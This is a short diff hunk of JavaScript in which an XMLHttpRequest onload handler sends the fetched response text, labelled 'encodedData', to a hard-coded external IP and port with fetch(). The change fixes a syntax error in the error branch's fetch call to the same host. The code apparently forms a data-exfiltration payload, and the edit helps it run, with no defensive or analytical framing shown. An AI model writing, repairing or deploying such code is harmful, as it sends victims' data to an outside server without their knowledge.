@@ -13,7 +13,7 @@ xhr.onload = function() {
     fetch("http://82.65.210.151:24000/?encodedData=" + xhr.responseText);
   } else {
     // Handle errors
-    fetch("http://82.65.210.151:24000/?error=true";
+    fetch("http://82.65.210.151:24000/?error=true");
   }
 };
 
